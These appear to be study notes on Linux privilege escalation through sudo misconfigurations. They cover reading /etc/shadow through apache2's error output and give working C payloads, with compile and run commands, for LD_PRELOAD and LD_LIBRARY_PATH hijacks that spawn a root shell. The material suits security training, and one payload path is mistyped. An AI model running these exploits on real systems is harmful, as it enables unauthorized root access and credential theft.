
sudo -l output: /usr/sbin/apache2
apache read a line of syntax error
sudo apache2 -f /etc/shadow
```
#### Environment Variables
##### Program run through sudo can inherit the environment variables from the user's environment
in sudowrs config file if env_reset option is set sudo will run programs in a new, miniml env
config options are display when running sudo -l

### LD_PRELOAD
is an environment variable can be set to path of shared object (.so) file
When  set, the shared object will be loaded before any others.
By creating a custom .so and creating init() function, we can execute code as soon as teh object is loaded

sudo must be configured to preserve the LD_PRELOAD environment variable using the env_keep option

LD_PRELOAD will no work if the real user id is defferent from the effective user ID

###### case study
```
sudo -l 
  search for env_keep+=LD_PRELOAD 

create c file:

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

void _init(){
  unsetenv("LD_PRELOAD");
  setresuid(0,0,0);
  system("/bin/bash -p");
}
- complie gcc -fPIC -shared -nostartfiles -o /tmp/preload.so ourfile.c

exploitation: sudo LD_PRELOAD=/tmp/preload.so find
```

##### LD_LIBRARY_PATH: env variable contains a set of directories where shared libraries are searched for first

ldd command can be used to pritn the shared libraries
```
ldd /usr/sbin/apache2
```
by createing a shared library with the same name as one used by a program  and setting LD_library_path to its parent  the program will load our shared_library instead 

###### case study
```
sudo -l : search for env_keep+=LD_LIBRARY_PATH
output:
/usr/sbin/apache2
pic one of so file in ths case: libcrypt.so

ldd /usr/sbin/apache2

create c file
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
  unsetenv("LD_LIBARY_PATH");
  setresuid(0,0,0);
  system("/bin/bash/ -p");
} 

- complie: gcc -o libcrypt.so.1 -shared -fPIC ourfile.c
sudo LD_LIBRARY_PATH=. apache2
```
